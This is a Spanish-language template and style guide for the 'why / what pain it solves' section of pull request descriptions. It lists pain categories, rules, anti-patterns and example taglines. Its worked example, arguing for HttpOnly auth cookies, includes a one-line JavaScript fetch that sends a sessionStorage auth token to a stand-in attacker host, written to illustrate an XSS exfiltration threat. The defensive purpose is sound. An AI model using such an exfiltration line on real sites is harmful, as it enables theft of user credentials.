# Pain section template · PR description

> Sección "🩹 Por qué · qué dolor soluciona" obligatoria en cada PR del fan-out.
> Va inmediatamente después del bloque "## Descripción de los cambios".

## Estructura canónica

```markdown
## 🩹 Por qué · qué dolor soluciona

**<Tagline en una línea · stakeholder concreto que sufre + qué pierden hoy>.**

### 1. <Categoría del dolor> — <breve descripción>

- <Punto específico con evidencia: archivo:línea, comando, dato>.
- <Punto específico, no abstracto>.
- <Frecuencia / probabilidad real cuando aplique>.

### 2. <Segunda categoría> — <descripción>

...

### N. Costo de no hacerlo

- **Riesgo <tipo>**: <descripción concreta + magnitud>.
- **Costo operacional**: <X min × Y veces/mes = Z h/mes desperdiciadas>.
- **Costo reputacional**: <quién se entera + cómo>.

### N+1. Costo de hacerlo

~<Nd|Nh> con IA. <Risk level>. <Coord cross-team si aplica>.

### N+2. Backward compat (si aplica)

<estrategia de rollout · feature flag · telemetry · canary>.
```

## Categorías del dolor (5 canónicas + posibles)

1. **Legal · regulatorio** — Ley 25.326, GDPR, BCRA, DNPDP, ePrivacy. Multa concreta + auditor que detecta.
2. **Seguridad** — Threat model concreto + frecuencia industria + OWASP/PCI compliance + impact técnico.
3. **UX visible** — Flash, CLS, hydration warnings, percepción de bug, tickets soporte.
4. **Data quality** — Métricas contaminadas, decisiones sobre data sucia, lift fantasma, indexing SEO falso.
5. **Observability / incident response** — Tiempo oncall por incident, debug ciego, cross-canal imposible.

Otras categorías posibles según contexto:
- **Performance** — LCP, FID, INP, TTI degradados.
- **Compliance** — SOC2, ISO 27001, requisito partner.
- **DX** — Build time, test flakiness, warning noise.
- **Costo $$$** — Infra over-provisioning, costo CDN, costo licencia.

## Reglas

1. **Nombrar al stakeholder real** que sufre hoy. Si no podés nombrarlo, el PR no se justifica.
2. **Evidencia concreta** > abstracta. "OWASP recomienda" es débil; "Polyfill.io junio 2024 infectó 100K sitios" es fuerte.
3. **Costo cuantificado** cuando aplique. "30min oncall por incident × 5 incidents/mes = 2.5h/mes" > "incident response lento".
4. **Costo de no hacerlo** explícito. Sin costo de no hacer, el PR es opcional.
5. **Costo de hacer** transparente. Esfuerzo con IA + risk level + dependencies. Sin esto, no se puede priorizar.
6. **Backward compat solo si aplica**. No inventes rollout strategy para cambios aditivos.

## Anti-patrones

| Anti-pattern | Por qué evitarlo |
|---|---|
| "Mejorar la seguridad" | No nombra qué amenaza, qué token, qué vector. |
| "Buenas prácticas industria" | Apela a autoridad sin evidencia ni stakeholder. |
| "Esto puede explotar a futuro" | "Puede" sin probabilidad ni precedente. |
| "Modernizar stack" | Modernizar sin dolor = costos sin upside. |
| "Reduce technical debt" | TD sin nombrar qué TD ni cuánto cuesta hoy. |
| "Mejora developer experience" | DX general sin métrica (build time, warnings, etc.). |

## Ejemplo correcto (PR #1516 auth-httponly)

```markdown
## 🩹 Por qué · qué dolor soluciona

**Vector real de robo de credenciales hoy abierto. Un script third-party comprometido = todos los tokens MODO leaked.**

### 1. Threat model concreto — XSS exfil window

- Token auth SDK vive en `sessionStorage.auth-token-sdk` (src/utils/sessionStorage.ts:8-16).
- CSP modo-landing permite `'unsafe-inline'` en `script-src` (next.config.js:149) y 10+ scripts third-party permitidos:
  - Botmaker (chat) · Freshbots · CrazyEgg · AppsFlyer · GTM · Amplitude · Firebase · Facebook · TikTok · LinkedIn · doubleclick.
- Cualquier de estos scripts comprometido puede ejecutar:
  ```js
  fetch('https://attacker.com/exfil', { method: 'POST', body: globalThis.sessionStorage.getItem('auth-token-sdk') })
  ```

### 2. Frecuencia real del vector

- Supply-chain attacks en CDNs third-party: Polyfill.io (junio 2024, 100K+ sites infected), CrowdStrike (julio 2024), Magecart (constante).
- AppsFlyer + Botmaker + CrazyEgg = 3 vendors con script execution en modo.com.ar fuera del control MODO.

### 3. Compliance — estándares ya esperan esto

- OWASP ASVS Level 2: V3.5.3 "Sensitive tokens MUST NOT be stored in localStorage/sessionStorage." Hoy fallamos.

### 4. Costo de no hacerlo

- Token leak → fraud BFF → financial liability + Mastercard chargeback fines.
- BCRA + DNPDP pueden auditar y multar.
- Si leak se publica: "MODO leaks user tokens" = front page TN/Clarín/Infobae.

### 5. Costo de hacerlo

~8d con IA. Cross-team (frontend + SDK Android + SDK iOS + BFF). Único de los 7 PRs con dependency cross-team.

### 6. Backward compat — graceful rollout

N+1 release SDK soporta ambos paths (header + cookie). Telemetry mide adoption. Flippeo flag canary → prod cuando 95%+ usa cookie. 0 break para users con SDK viejo.
```

## Tagline canónica por iniciativa típica

| Iniciativa | Tagline sugerida |
|---|---|
| CMP consent (P0) | "Gap legal real + reputacional + data quality + UX. El más caro si no se hace." |
| Auth HttpOnly (P2) | "Vector real de robo de credenciales hoy abierto." |
| A/B server-bucketed (P1) | "Experiments hoy miden contaminados. Marketing decide sobre data sucia." |
| is_sdk flag (P1) | "Flash visible '¿es la app MODO o es web?' en WebView lento." |
| device_id (P3) | "Oncall pierde 30 min por incident reconstruyendo user journey." |
| Preview filter (FIX) | "Deuda silenciosa esperando explotar." |
